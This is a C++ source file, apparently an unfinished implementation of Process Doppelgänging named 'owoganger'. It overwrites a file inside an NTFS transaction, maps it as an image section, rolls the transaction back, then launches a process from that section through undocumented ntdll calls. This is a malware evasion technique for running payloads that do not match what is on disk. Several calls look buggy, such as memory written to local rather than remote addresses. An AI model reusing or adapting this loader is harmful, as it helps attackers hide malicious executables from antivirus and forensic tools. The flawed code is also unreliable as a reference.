// owoganger.cpp : Defines the entry point for the console application.
//

#pragma once //circular dependencies ehh
#include "stdafx.h"
#include "typedefs.h"
#include <iostream>
#include <vector>
#include "owoganger.h"
#include "argParser.h"
//#include <Ntdef.h> weird errors if including





owoganger::owoganger(std::string source, std::string dest)
{
	this->source = source.c_str();
	this->destination = dest.c_str();
	ntdll = GetModuleHandle(TEXT("ntdll.dll"));
	//GO
	this->transact();
}

owoganger::~owoganger()
{
	CloseHandle(ntdll);
}

void owoganger::transact()
{
	HANDLE hTransaction = 0;
	HANDLE hDestFile = 0;
	HANDLE hSourceFile = 0;
	

	hTransaction = CreateTransaction(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	if (hTransaction == INVALID_HANDLE_VALUE) {
		std::cout << "Error during transcation creation" << std::endl;
		exit(-1);
	}
	hDestFile = CreateFileTransacted(this->destination, (GENERIC_READ | GENERIC_WRITE), 0, NULL, CREATE_ALWAYS/*must overwrite*/, FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL);
	if (GetLastError() != 183) { // means file doesn't exist, so technique is kinda useless
		std::cout << "File at destination path isn't accessible to write or doesn't exist" << std::endl;
		exit(-2);
	}
	//read data from source file into buffer
	readFile();
	if (WriteFile(hDestFile, &exeBuf[0], exeBuf.size(), NULL, NULL) != TRUE) {
		std::cout << "Error during transacted file write" << std::endl;
		exit(-7);
	}
	this->load(hDestFile, hTransaction); // going to step 2


}

void owoganger::load(HANDLE hDestFile, HANDLE hTransaction)
{
	

	HANDLE hSection = 0;
	pNtCreateSection func = (pNtCreateSection)GetProcAddress(this->ntdll, "NtCreateSection");
	if (func == 0) {
		std::cout << "can't find NtCreateSection" << std::endl;
		exit(-8);
	}
	NTSTATUS res = func(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hDestFile);
	if(checkNtStatus(&res) != TRUE){
		std::cout << "Error during section creation" << std::endl;
		exit(-9);
	}
	this->rollback(hTransaction); // step 3
	CloseHandle(hTransaction);
	this->animate(hSection); // final step

}

void owoganger::rollback(HANDLE hTransaction)
{
	if (RollbackTransaction(hTransaction) == 0) {
		std::cout << "Can't rollback transaction" << std::endl;
		exit(-10);
	}
}

void owoganger::animate(HANDLE hSection)
{
	HANDLE hProc = 0;
	HANDLE hThread = 0;
	NTSTATUS res = 0;
	PROCESS_BASIC_INFORMATION procBasicInfo = { 0 };
	PROCESSINFOCLASS procInfo = ProcessBasicInformation;
	PVOID pPeb = 0;
	ULONG_PTR ep = 0, ib = 0;
	UNICODE_STRING path; 
	PRTL_USER_PROCESS_PARAMETERS ProcParams = NULL;

	//BSOD soon :)
	pNtCreateProcessEx func = (pNtCreateProcessEx)GetProcAddress(this->ntdll, "NtCreateProcessEx");
	// TODO try with PsCreateMinimalProcess
	if (func == 0) {
		std::cout << "Can't find NtCreateProcessEx" << std::endl;
		CloseHandle(hSection);
		exit(-11);
	}
	res = func(&hProc, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), 4/*PS_INHERIT_HANDLES*/, hSection, NULL, NULL, FALSE);
	if (checkNtStatus(&res) != TRUE) {
		std::cout << "Can't create process" << std::endl;
		exit(-12);
	}
	//get entry point
	//ain't gonna work if PE_HEADER destroyed :)
	pNtQueryInformationProcess query_func = (pNtQueryInformationProcess)GetProcAddress(this->ntdll, "NtQueryInformationProcess");
	if (query_func == 0) {
		std::cout << "Can't find NtQueryInformationProcess" << std::endl;
		exit(-13);
	}
	res = query_func(hProc, procInfo, &procBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), NULL);
	if (checkNtStatus(&res) != TRUE) {
		std::cout << "Can't find entry point" << std::endl;
		exit(-14);
	}
	pPeb = procBasicInfo.PebBaseAddress;
	pNtReadVirtualMemory read_func = (pNtReadVirtualMemory)GetProcAddress(this->ntdll, "NtReadVirtualMemory");

	//still searching entry point
	pRtlImageNtHeader RtlImageNtHeader = (pRtlImageNtHeader)GetProcAddress(this->ntdll, "RtlImageNtHeader");
	if (RtlImageNtHeader == 0) {
		std::cout << "Can't find RtlImageNtHeader" << std::endl;
		exit(-15);
	}
	BYTE  tmpbuf[MAX_BUF_SIZE]{ 0 };
	//res = read_func(hProc, pPeb, tmpbuf, PE_HEADER, NULL); 
	ReadProcessMemory(hProc, pPeb, &tmpbuf, MAX_BUF_SIZE, NULL);
	ep = (ULONG_PTR)RtlImageNtHeader(&this->exeBuf[0])->OptionalHeader.AddressOfEntryPoint;
	ep += (ULONG_PTR)((PPEB)tmpbuf)->ImageBaseAddress;
	//ULONG_PTR test = (ULONG_PTR)((PPEB)tmpbuf)->ProcessParameters;
	pRtlCreateProcessParametersEx RtlCreateProcessParametersEx = (pRtlCreateProcessParametersEx)GetProcAddress(this->ntdll, "RtlCreateProcessParametersEx");
	if (RtlCreateProcessParametersEx == 0) {
		std::cout << "Can't find RtlCreateProcessParametersEx" << std::endl;
		exit(-16);
	}
	pRtlInitUnicodeString RtlInitUnicodeString = (pRtlInitUnicodeString)GetProcAddress(this->ntdll, "RtlInitUnicodeString");
	if (RtlInitUnicodeString == 0) {
		std::cout << "Can't find RtlInitUnicodeString" << std::endl;
		exit(-17);
	}
	RtlInitUnicodeString(&path,(PCWSTR)TEXT(this->destination));
	res = RtlCreateProcessParametersEx(&ProcParams, &path, NULL, NULL, &path, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
	if (checkNtStatus(&res) != TRUE) {
		std::cout << "Error during process parameters creation" << std::endl;
		exit(-18);
	}
	SIZE_T size = ProcParams->Length;
	LPVOID rParamsAddr = VirtualAllocEx(hProc, &ProcParams, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (rParamsAddr == NULL) {
		std::cout << "Failed to allocate memory for parameters" << std::endl;
		exit(-19);
	}
	if(WriteProcessMemory(hProc, rParamsAddr, ProcParams, size, NULL) == 0)
	{
		std::cout << "Failed to write to process memory" << std::endl;
		exit(-20);
	}
	//I FUCKING HATE IT
	BYTE pebBuf[sizeof(PEB)]{ 0 };
	PVOID rPebAddr = procBasicInfo.PebBaseAddress;
	std::cout << "RPEB addr " << rPebAddr;
	DWORD bytesRead = 0;
	//ReadProcessMemory(&hProc, rPebAddr, pebBuf, sizeof(PEB), &bytesRead);
	res = read_func(&hProc, rPebAddr, &pebBuf, sizeof(PEB), &bytesRead);
	std::cout << GetLastError() << std::endl;
	if (checkNtStatus(&res) != NULL || bytesRead == 0) {
		std::cout << "Failed to fetch remote PEB" << std::endl;
		exit(-30);
	}
	ULONG_PTR rPebParamsAddr = (ULONG_PTR)((PPEB)pebBuf)->ProcessParameters;
	
	/*ULONGLONG rPebAddr = (ULONGLONG)procBasicInfo.PebBaseAddress;
	PEB tmp = { 0 };
	ULONGLONG offset = (ULONGLONG)&tmp.ProcessParameters - (ULONGLONG)&tmp; // thanks https://github.com/hasherezade/process_doppelganging/blob/master/main.cpp
	LPVOID rImgBase = (LPVOID)(rPebAddr + offset);*/
	if (WriteProcessMemory(hProc, &((PPEB)tmpbuf)->ProcessParameters, &rParamsAddr, size, NULL) == 0)
	{
		std::cout << GetLastError() << std::endl;
		std::cout << "Failed to change PEB parameters address" << std::endl;
		exit(-21);
	}
	pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(this->ntdll, "NtCreateThreadEx");
	if (NtCreateThreadEx == 0) {
		std::cout << "Can't find NtCreateThreadEx" << std::endl;
		exit(-22);
	}
	res = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc, (LPTHREAD_START_ROUTINE)ep, NULL, FALSE, 0, 0, 0, NULL);
	if (checkNtStatus(&res) != TRUE || hThread == INVALID_HANDLE_VALUE) {
		std::cout << "Failed to create Thread" << std::endl;
	}
	ResumeThread(hThread);
	//LOOKS LIKE WE'RE DONE

	
	
	
}

BOOL owoganger::checkNtStatus(NTSTATUS* res)
{
	if ((*res >= 0x0 && *res <= 0x3FFFFFFF) || (*res >= 0x40000000 && *res <= 0x7FFFFFFF)) {
		return TRUE;
	}
	return FALSE;
}

void owoganger::readFile()
{
	PLARGE_INTEGER fileSize = NULL;
	HANDLE hSourceFile = 0;
	
	BOOL eofFlag = FALSE;
	BYTE *tmpBuf = new BYTE[MAX_BUF_SIZE];
	DWORD bytesRead = 0;
	//DWORD bytesToRead = MAX_BUF_SIZE

	hSourceFile = CreateFile(this->source, GENERIC_READ, 0, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hSourceFile == INVALID_HANDLE_VALUE) {
		std::cout << "Error while opening source file" << std::endl;
		exit(-4);
	}
	if (GetLastError() != 183) {
		std::cout << "Source file doesn't exist or can't be opened" << std::endl;
		CloseHandle(hSourceFile);
		exit(-5);
	}
	while(TRUE){//reading file by chunks
		eofFlag = ReadFile(hSourceFile, tmpBuf, MAX_BUF_SIZE, &bytesRead, NULL);
		if (bytesRead != 0) {
			this->exeBuf.insert(exeBuf.end(), tmpBuf, tmpBuf + bytesRead);
		}
		if (eofFlag == TRUE && bytesRead == 0) {
			break; //encountered EOF
		}
	}
	this->exeBuf.shrink_to_fit();

	//get file size for buf allocation
	/*if (GetFileSizeEx(hSourceFile, fileSize) == 0) {
		std::cout << "Error while getting source file size" << std::endl;
		CloseHandle(hSourceFile);
		exit(-6);
	}
	buf = new BYTE[fileSize->QuadPart]; */
	return;
}

int main(int argc, char** argv)
{
	argParser parser = argParser(argc, argv);
    return 0;
}

